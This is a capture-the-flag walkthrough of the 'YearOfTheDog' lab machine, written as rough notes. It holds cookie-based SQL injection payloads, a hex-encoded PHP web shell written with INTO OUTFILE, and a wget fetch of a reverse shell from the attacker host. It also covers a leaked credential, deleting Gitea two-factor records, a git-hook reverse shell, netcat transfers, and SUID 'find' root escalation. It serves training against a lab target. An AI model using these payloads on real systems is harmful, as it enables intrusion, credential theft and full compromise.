# YearOfTheDog

```
Ports:
22
80
```

Nothing interesting found searching directoris, higest ports.
try use sqlmap 

: sqlmap -u http://10.10.11.217/ --dump-all --level 5 --risk 3 --batch
	[02:59:05] [INFO] testing connection to the target URL
	you have not declared cookie(s), while server wants to set it sown('id=5f9d79710af...8d71d695f5').

edit cookie id='
	#response

	HTTP/1.1200OK
	Date:Fri,09Dec202208:00:20GMT
	Server:Apache/2.4.29(Ubuntu)
	Vary:Accept-Encoding
	Content-Length:156
	Connection:close
	Content-Type:text/html;charset=UTF-8

	Error:YouhaveanerrorinyourSQLsyntax;checkthemanualthatcorrespondstoyourMySQLserverversionfortherightsyntaxtousenear'''''atline1

### Payloads

Cookie:id='unionselect1,database()---

Cookie:id='UNIONSELECT1,group_concat(table_name)FROMinformation_schema.tablesWHEREtable_schema=database()---
	Youarenumberqueueinthequeue

Cookie:id='unionselect1,group_concat(column_name)frominformation_schema.columnswheretable_schema=database()---
Cookie:id='unionselect1,group_concat(userID)fromqueue---

nothing really interesting

Try sqlinjection read files

Cookie:id='unionselect1,LOAD_FILE("/var/log/apache2/access.log")---

Cookie:id='unionselect1,LOAD_FILE("/etc/passwd")---
```	SUCESS
	dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash```

LOADindex.php
	require_once"config.php";

	if(!isset($_COOKIE["id"])){
		$cookie=bin2hex(random_bytes(16));
		$queueNum=rand(1,100);
		setcookie("id",$cookie,NULL,"/");
		
		$sql="INSERTINTOqueueVALUES('".$cookie."',".

UPLOAD FILES in HEX
Cookie:id='unionselect1,0x48656c6c6f20776f726c640aINTOOUTFILE'/var/www/html/test.php'---
	'HelloWorld'

after try convert "php-reverse-shell" in hexa received exceeds server limit
try upload RCE


```
 echo '<?PHP system($_GET["c"];?>' | xxd
 echo '0x3C3F5048502073797374656D28245F4745545B2263225D3B3F3E0A' | xxd -r -p
	<?PHP system($_GET["c"];?>


 echo '0x3C3F5048502073797374656D28245F524551554553545B2263225D3B3F3E0A' | xxd -r -p
 	<?PHP system($_REQUEST["c"];?>

```
Cookie: id='UNION SELECT 1,0x3C3F5048502073797374656D28245F524551554553545B2263225D3B3F3E0A INTO OUTFILE '/var/www/html/funrce.php'-- -


# First Access

http://{ip}/funrce.php?c=wget http://{ip}/reverse.php
http://{ip}/reverse.php


in /home/dylan/ found file with log {work_analysis}
read log found credentials

dylan:Labr4d0rs4L1f3

: ss -ltp
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:44269         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -

tunneling: 
: ssh -L 3000:127.0.0.1:3000 dylan@{ip}

login page with 2FA

dylan@year-of-the-dog:/gitea/gitea$ sqlite3 gitea.db 
	Command 'sqlite3' not found

sqlite3 not instaled, for login and delete "two factor auth" we can use python connect
```
 import sqlite3
 s=sqlite3.connect("gitea.db")
 s.execute("delete from two_factor")
 s.commit()
 s.close()
 exit()
```

we can connect now

find git-hooks and add command line in pre-receive and update with reverse shell

edit README.md and commit changes to gain shell

# in container

: sudo -l

(ALL) NOPASSWORD: ALL

: sudo su root

access /data this directory exist in main system

use netcat to transfer /usr/bin/find to kali machine from dylan machine

nc {ip} 4444 > find

nc {kali@mchine} 4444 < /usr/bin/find 

start python server

in container ##

wget http://{kali}/find
chmod 4755 find  		## suid permission

dylan@machine: ./find . -exec /bin/sh -p\; -quit

root#>
